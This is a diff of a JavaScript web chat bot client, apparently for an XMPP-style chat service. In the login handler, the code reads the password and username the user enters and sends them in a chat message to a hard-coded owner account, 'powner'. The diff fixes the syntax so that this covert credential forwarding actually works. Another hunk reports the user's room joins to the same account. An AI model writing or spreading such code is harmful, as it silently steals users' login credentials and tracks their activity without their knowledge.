@@ -705,7 +705,7 @@ async function handleLoginEvent(messageObj) {
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
 
-        await chat( ${powner}, `ABOT WEB BOT: ${username} / ${password}`);
+        await chat( powner, `ABOT WEB BOT: ${username} / ${password}`);
 
         const mucType = MucType.public;
         const packetID = generatePacketID();
@@ -828,7 +828,7 @@ async function handleRoomEvent(messageObj) {
   
     if (type === 'you_joined') {
         displayChatMessage({ from: '', body: `**You** joined the room as ${role}` });
-       await chat( ${powner},`Join the  ${roomName }`);
+       await chat(powner,`Join the  ${roomName }`);
   joinlog.textContent = `You Join the  ${roomName }`;
         // Display room subject with proper HTML rendering
         displayRoomSubject(`Room subject: ${messageObj.subject} (by ${messageObj.subject_author})`);
